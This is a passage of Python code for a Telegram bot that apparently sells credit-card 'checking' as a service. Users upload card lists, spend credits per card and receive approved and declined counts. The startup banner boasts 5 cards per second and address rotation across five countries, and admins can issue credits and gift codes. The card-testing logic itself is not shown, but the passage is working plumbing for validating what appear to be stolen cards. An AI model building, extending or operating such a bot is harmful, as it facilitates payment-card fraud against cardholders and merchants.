    user = await get_user(user_id)
    
    # Send summary
    summary_text = f"""*🎯 MASS CHECK COMPLETE*
══════════════════════
*Statistics:*
• Total Cards: {len(cards)}
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• Success Rate: {success_rate:.1f}%
• Credits Used: {processed}
• Time Taken: {elapsed:.1f}s
• Speed: ⚡ {len(cards)/elapsed:.1f} cards/second

*Your Balance:* {user['credits']} credits
══════════════════════
"""
    
    try:
        await status_msg.edit_text(summary_text, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel check button"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    if query.data.startswith("cancel_check_"):
        try:
            user_id = int(query.data.split("_")[2])
        except:
            try:
                await query.answer("Invalid request", show_alert=True)
            except:
                pass
            return
        
        if user_id in checking_tasks:
            checking_tasks[user_id]["cancelled"] = True
            
            # Calculate used credits
            processed = checking_tasks[user_id]["cards_processed"]
            approved = checking_tasks[user_id].get("approved", 0)
            declined = checking_tasks[user_id].get("declined", 0)
            
            user = await get_user(user_id)
            used_credits = processed
            
            # Update user credits
            updates = {
                'credits': user["credits"] - used_credits,
                'credits_spent': user.get("credits_spent", 0) + used_credits,
                'checks_today': user.get("checks_today", 0) + processed,
                'total_checks': user["total_checks"] + processed,
                'approved_cards': user.get("approved_cards", 0) + approved,
                'declined_cards': user.get("declined_cards", 0) + declined,
                'last_check_date': datetime.datetime.now().date()
            }
            await update_user(user_id, updates)
            
            # Update bot statistics
            await update_bot_stats({
                'total_checks': processed,
                'total_credits_used': processed,
                'total_approved': approved,
                'total_declined': declined
            })
            
            # Refresh user data
            user = await get_user(user_id)
            
            await query.edit_message_text(
                f"*🛑 CHECK CANCELLED*\n"
                f"══════════════════════\n"
                f"*Results:*\n"
                f"• Processed: {processed} cards\n"
                f"• ✅ Approved: {approved}\n"
                f"• ❌ Declined: {declined}\n"
                f"• Credits Used: {used_credits}\n\n"
                f"*New Balance:* {user['credits']} credits",
                parse_mode=ParseMode.MARKDOWN
            )
            
            if user_id in checking_tasks:
                del checking_tasks[user_id]
        else:
            try:
                await query.answer("No active check found", show_alert=True)
            except:
                pass

async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload messages"""
    if not update.message.document:
        return
    
    user_id = update.effective_user.id
    file = update.message.document
    
    # Check if file is TXT
    if not file.file_name.lower().endswith('.txt'):
        await update.message.reply_text(
            "❌ Please upload only .txt files",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Store file info temporarily
    file_id = file.file_id
    files_storage[user_id] = {
        "file_id": file_id,
        "file_name": file.file_name,
        "timestamp": datetime.datetime.now().isoformat(),
        "message_id": update.message.message_id
    }
    
    await update.message.reply_text(
        f"*📁 FILE RECEIVED*\n"
        f"══════════════════════\n"
        f"*File:* `{file.file_name}`\n\n"
        f"To start mass check, use:\n"
        "`/mchk`\n\n"
        f"*Note:* Each card will use 1 credit.",
        parse_mode=ParseMode.MARKDOWN
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully"""
    error_msg = str(context.error) if context.error else "Unknown error"
    logger.error(f"Exception: {error_msg}")
    
    # Ignore common non-critical errors
    if "Message is not modified" in error_msg:
        return
    if "Query is too old" in error_msg:
        return
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "*⚠️ SYSTEM ERROR*\n"
                "An error occurred. Please try again.\n"
                "If problem persists, contact admin.",
                parse_mode=ParseMode.MARKDOWN
            )
    except Exception as e:
        logger.error(f"Error in error handler: {e}")

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands"""
    await update.message.reply_text(
        "*❌ Invalid Command*\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN
    )

def main():
    """Start the bot"""
    # Initialize database before starting bot
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_database())
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # ========== COMMAND HANDLERS ==========
    # Public commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("invite", invite_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("claim", claim_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin commands
    application.add_handler(CommandHandler("botinfo", botinfo_command))
    application.add_handler(CommandHandler("userinfo", userinfo_command))
    application.add_handler(CommandHandler("addcr", addcr_command))
    application.add_handler(CommandHandler("gengift", gengift_command))
    application.add_handler(CommandHandler("listgifts", listgifts_command))
    
    # ========== MESSAGE HANDLERS ==========
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload_message))
    
    # ========== CALLBACK HANDLERS ==========
    application.add_handler(CallbackQueryHandler(verify_join_callback, pattern="^verify_join$"))
    application.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    application.add_handler(CallbackQueryHandler(quick_check_callback, pattern="^quick_check$"))
    application.add_handler(CallbackQueryHandler(mass_check_callback, pattern="^mass_check$"))
    application.add_handler(CallbackQueryHandler(my_credits_callback, pattern="^my_credits$"))
    application.add_handler(CallbackQueryHandler(invite_callback, pattern="^invite$"))
    application.add_handler(CallbackQueryHandler(copy_invite_callback, pattern="^copy_invite$"))
    application.add_handler(CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(claim_gift_callback, pattern="^claim_gift$"))
    application.add_handler(CallbackQueryHandler(start_mass_check_callback, pattern="^start_mass_"))
    application.add_handler(CallbackQueryHandler(cancel_check_callback, pattern="^cancel_check_"))
    application.add_handler(CallbackQueryHandler(cancel_check_callback, pattern="^cancel_mass$"))
    
    # Admin panel callbacks
    application.add_handler(CallbackQueryHandler(admin_addcr_callback, pattern="^admin_addcr$"))
    application.add_handler(CallbackQueryHandler(admin_gengift_callback, pattern="^admin_gengift$"))
    application.add_handler(CallbackQueryHandler(admin_listgifts_callback, pattern="^admin_listgifts$"))
    application.add_handler(CallbackQueryHandler(admin_userinfo_callback, pattern="^admin_userinfo$"))
    application.add_handler(CallbackQueryHandler(admin_botinfo_callback, pattern="^admin_botinfo$"))
    
    # ========== UNKNOWN COMMAND HANDLER ==========
    # Must be added LAST to catch all other commands
    application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
    
    # Start bot
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
    print(f"⚡ Speed: 5 cards/second")
    print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
    print(f"🤝 Invite & Earn: 50 credits per referral")
    print(f"📊 Database: ✅ Connected")
    print(f"🔐 Admin Commands: {len(ADMIN_IDS)} admin(s)")
    print("✅ Bot is running...")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
